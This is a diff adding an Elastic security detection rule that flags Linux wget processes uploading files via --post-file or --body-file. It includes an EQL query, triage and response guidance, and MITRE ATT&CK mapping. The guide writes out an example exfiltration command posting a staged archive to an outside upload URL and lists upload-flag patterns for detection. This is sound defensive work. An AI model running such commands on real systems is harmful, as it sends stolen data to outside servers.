@@ -1,0 +1,117 @@
+[metadata]
+creation_date = "2026/01/07"
+integration = ["endpoint", "crowdstrike", "sentinel_one_cloud_funnel", "auditd_manager"]
+maturity = "production"
+updated_date = "2026/01/12"
+
+[rule]
+author = ["Elastic"]
+description = """
+Detects the use of wget to upload files to an internet server. Threat actors often will collect data on a system
+and attempt to exfiltrate it back to their command and control servers. Use of wget in this way, while not
+inherently malicious, should be considered highly abnormal and suspicious activity.
+"""
+from = "now-9m"
+index = [
+    "auditbeat-*",
+    "endgame-*",
+    "logs-auditd_manager.auditd-*",
+    "logs-crowdstrike.fdr*",
+    "logs-endpoint.events.process*",
+    "logs-sentinel_one_cloud_funnel.*",
+]
+language = "eql"
+license = "Elastic License v2"
+name = "Potential Data Exfiltration Through Wget"
+note = """ ## Triage and analysis
+
+> **Disclaimer**:
+> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
+
+### Investigating Potential Data Exfiltration Through Wget
+
+This rule flags Linux processes that launch wget with options that upload a local file via HTTP POST, a behavior used to exfiltrate staged data to an external server. Attackers gather files, compress them in /tmp, then execute wget --post-file=/tmp/loot.tar.gz https://example.com/upload from a non-interactive shell or cron job to covertly push the archive out over standard web traffic.
+
+### Possible investigation steps
+
+- Pull the full command line to extract the posted file path, verify the file still exists, capture size/timestamps, and hash its contents to gauge sensitivity and origin.
+- Review the process tree and session context (parent, user, TTY, cron/systemd/container) and correlate with recent logins or scheduler entries to determine whether this was automated or a remote shell action.
+- Enrich the destination endpoint with DNS, WHOIS, certificate, proxy, and egress firewall logs, and check for prior communications from this host to the same domain/IP to assess legitimacy.
+- Pivot 30–60 minutes prior on the host/user for staging activity such as tar/gzip in /tmp, bulk file collection, or discovery commands, and interrogate shell history and filesystem events tied to the posted file.
+- If the file was removed post-upload, attempt recovery from EDR or backups and estimate exfil volume and content types via proxy or egress gateway logs to determine impact and drive containment.
+
+### False positive analysis
+
+- A maintenance or monitoring script run via cron posts log archives or configuration snapshots using wget --post-file to an internal HTTP endpoint for routine diagnostics.
+- An administrator or developer testing a web form or API uses wget --body-file to POST a sample file during troubleshooting, producing a benign one-off event.
+
+### Response and remediation
+
+- Immediately isolate the host, terminate the offending wget process, block outbound HTTP(S) to the destination domain/IP seen in the command wget --post-file=/path/to/file https://example.com/upload, and quarantine the posted file path and its parent directory.
+- Identify and disable any cron, systemd, or shell script that invoked wget with --post-file or --body-file (e.g., entries in /etc/cron.d/, user crontabs, or /home/user/.local/bin/upload.sh), delete the script, and revoke the invoking account’s API tokens and SSH keys.
+- Remove staged archives and temp files referenced in the upload (e.g., /tmp/loot.tar.gz and /var/tmp/*.gz), delete companion tooling or collection scripts found alongside them, and reimage the host if system integrity cannot be assured.
+- If the posted content includes credentials, source code, or customer data, rotate affected passwords/keys, invalidate tokens, notify data owners, and restore impacted systems or files from known-good backups.
+- Escalate to incident response and initiate wider containment if the destination domain/IP is not owned by the organization or resolves to an anonymizing/VPS service, if multiple hosts exhibit wget --post-file from non-interactive sessions, or if the uploader executed as root.
+- Harden by enforcing SELinux/AppArmor policies that restrict wget/curl from posting files, requiring egress web proxy allowlists for HTTP POST destinations, adding detections for wget --post-file/--body-file and curl --upload-file/-F, and removing wget from systems where it is unnecessary.
+"""
+references = ["https://gtfobins.github.io/gtfobins/wget/"]
+risk_score = 47
+rule_id = "8d8c0b55-ef27-4c20-959f-fa8dd3ac25e6"
+setup = """## Setup
+
+This rule requires data coming in from Elastic Defend.
+
+### Elastic Defend Integration Setup
+Elastic Defend is integrated into the Elastic Agent using Fleet. Upon configuration, the integration allows the Elastic Agent to monitor events on your host and send data to the Elastic Security app.
+
+#### Prerequisite Requirements:
+- Fleet is required for Elastic Defend.
+- To configure Fleet Server refer to the [documentation](https://www.elastic.co/guide/en/fleet/current/fleet-server.html).
+
+#### The following steps should be executed in order to add the Elastic Defend integration on a Linux System:
+- Go to the Kibana home page and click "Add integrations".
+- In the query bar, search for "Elastic Defend" and select the integration to see more details about it.
+- Click "Add Elastic Defend".
+- Configure the integration name and optionally add a description.
+- Select the type of environment you want to protect, either "Traditional Endpoints" or "Cloud Workloads".
+- Select a configuration preset. Each preset comes with different default settings for Elastic Agent, you can further customize these later by configuring the Elastic Defend integration policy. [Helper guide](https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html).
+- We suggest selecting "Complete EDR (Endpoint Detection and Response)" as a configuration setting, that provides "All events; all preventions"
+- Enter a name for the agent policy in "New agent policy name". If other agent policies already exist, you can click the "Existing hosts" tab and select an existing policy instead.
+For more details on Elastic Agent configuration settings, refer to the [helper guide](https://www.elastic.co/guide/en/fleet/8.10/agent-policy.html).
+- Click "Save and Continue".
+- To complete the integration, select "Add Elastic Agent to your hosts" and continue to the next section to install the Elastic Agent on your hosts.
+For more details on Elastic Defend refer to the [helper guide](https://www.elastic.co/guide/en/security/current/install-endpoint.html).
+"""
+severity = "medium"
+tags = [
+  "Domain: Endpoint",
+  "OS: Linux",
+  "Use Case: Threat Detection",
+  "Tactic: Exfiltration",
+  "Data Source: Auditd Manager",
+  "Data Source: Elastic Defend",
+  "Data Source: Crowdstrike",
+  "Data Source: SentinelOne",
+  "Data Source: Elastic Endgame",
+  "Resources: Investigation Guide",
+]
+timestamp_override = "event.ingested"
+type = "eql"
+query = '''
+process where host.os.type == "linux" and event.type == "start" and
+event.action in ("exec", "exec_event", "start", "ProcessRollup2", "executed", "process_started") and
+process.name == "wget" and process.args like ("--post-file=*", "--body-file=*")
+'''
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+  [rule.threat.tactic]
+  name = "Exfiltration"
+  id = "TA0010"
+  reference = "https://attack.mitre.org/tactics/TA0010/"
+
+    [[rule.threat.technique]]
+    name = "Exfiltration Over Alternative Protocol"
+    id = "T1048"
+    reference = "https://attack.mitre.org/techniques/T1048/"
